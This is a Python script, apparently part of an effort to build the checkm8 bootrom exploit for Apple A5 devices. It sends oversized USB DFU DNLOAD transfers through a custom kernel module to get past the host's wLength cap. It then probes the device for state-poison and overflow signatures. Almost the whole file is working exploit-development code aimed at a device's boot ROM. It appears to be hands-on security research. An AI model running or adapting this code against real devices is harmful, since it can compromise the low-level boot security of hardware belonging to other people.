#!/usr/bin/env python3
"""Push-overshoot: the A5's "second 0x40 packet past the allocation"
state-poison install, delivered via hand-written TRBs - the only path
on this kernel that escapes the xHCI wLength cap.

Per round: PUSH a complete DNLOAD TD whose data TRBs exceed the
setup's wLength (the module chunks data 0x40 at a time, bypassing the
kernel's control-TD capping), kick with a tiny kernel serve (the
proven bell), then probe: short-wLength reads (the -75 poison
signature), DFU GETSTATUS state, and serve health.
"""
import ctypes
import fcntl
import glob
import importlib.util
import os
import struct
import time

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location(
    "dayone", os.path.join(HERE, "checkm8-a5-pwn.py"))
d = importlib.util.module_from_spec(spec)
spec.loader.exec_module(d)

RB_SIZE = 8 + 4096
ST_SIZE = 40
NDUMP = 48
RD_SIZE = 6 * 4 + NDUMP * 4 * 4 + 1024
IOC_PUSH = (1 << 30) | (32 << 16) | (ord("R") << 8) | 1
IOC_STATE = (2 << 30) | (ST_SIZE << 16) | (ord("R") << 8) | 3


def dfu_present():
    for p in glob.glob("/sys/bus/usb/devices/*/idProduct"):
        try:
            if open(p).read().strip() == "1227":
                return True
        except OSError:
            pass
    return False


def wait_dance(timeout=2400):
    if dfu_present():
        print("stale attached - power-hold + dance NOW", flush=True)
        while dfu_present():
            time.sleep(0.1)
        print("gone - dance now", flush=True)
    t0 = time.time()
    while time.time() - t0 < timeout:
        if dfu_present():
            return True
        time.sleep(0.05)
    return False


def module_state(rfd):
    buf = bytearray(ST_SIZE)
    fcntl.ioctl(rfd, IOC_STATE, buf, True)
    f = struct.unpack("<QIIIIIIII", buf)
    return f[5] == 1


def module_push(rfd, setup, data, dir_in):
    cdata = (ctypes.c_ubyte * max(64, len(data)))()
    ctypes.memmove(cdata, data, len(data))
    txn = bytearray(struct.pack("<8sIBBBBQII", setup, len(data), 1,
                               1, 1 if dir_in else 0, 0,
                               ctypes.addressof(cdata), 0, 0))
    return fcntl.ioctl(rfd, IOC_PUSH, txn, True)


def probe(usb, handle, r, b, w, i, l, data, name, timeout=500):
    try:
        rc, info = usb.raw_ctrl(handle, r, b, w, i, l, data,
                                abandon=False, timeout_ms=timeout,
                                name=name)
        status, actual = info[0], info[1]
        mark = ""
        if status == 6:
            mark = "  <<< EOVERFLOW SIGNATURE"
        elif status == 0 and (bm := r & 0x80) and actual > l:
            mark = "  <<< OVERSERVE"
        print("  %-16s: %-9s actual=%-3d %dus%s"
              % (name, d.STATUS_NAMES[status], actual, int(info[3]), mark),
              flush=True)
        return status
    except SystemExit:
        print("  %-16s: HANG" % name, flush=True)
        return None


def main():
    if not wait_dance():
        print("no entry", flush=True)
        return 1
    print("DFU in - settling", flush=True)
    time.sleep(1.3)
    rfd = os.open("/dev/raw0", os.O_RDWR)
    print("capture=%s" % module_state(rfd), flush=True)
    usb = d.LibUSB()
    dev, handle, desc, _ = d.acquire(usb, want_serial=False)
    probe(usb, handle, 0x80, 6, 0x0303, 0x0409, 0xB6, b'', "baseline-str3")

    shapes = [
        ("dnL-wL40-d80",  0x40, 0x80),
        ("dnL-wL40-dC0",  0x40, 0xC0),
        ("dnL-wL2C0-d300", 0x2C0, 0x300),
        ("dnL-wL40-d80",  0x40, 0x80),
    ]
    for name, wl, dl in shapes:
        setup = bytes([0x21, 0x01, 0x00, 0x00, 0x00, 0x00,
                       wl & 0xff, wl >> 8])
        module_push(rfd, setup, b'O' * dl, False)
        print("PUSH %s (wLength=0x%x data=0x%x)" % (name, wl, dl),
              flush=True)
        probe(usb, handle, 0x80, 6, 0x0303, 0x0409, 0xB6, b'', "kick")
        time.sleep(0.25)
        probe(usb, handle, 0x80, 6, 0x0100, 0, 8, b'', "p-wL8")
        probe(usb, handle, 0x80, 6, 0x0100, 0, 2, b'', "p-wL2")
        probe(usb, handle, 0xA1, 3, 0, 0, 6, b'', "getstatus")
        probe(usb, handle, 0x80, 6, 0x0303, 0x0409, 0xB6, b'', "serve-str3")
        time.sleep(0.4)

    print("--- final battery ---", flush=True)
    probe(usb, handle, 0x80, 6, 0x0100, 0, 8, b'', "final-p8")
    probe(usb, handle, 0x80, 6, 0x0100, 0, 18, b'', "final-p18")
    probe(usb, handle, 0x80, 6, 0x0303, 0x0409, 0xB6, b'', "final-str3")
    print("DONE", flush=True)
    return 0


if __name__ == "__main__":
    main()
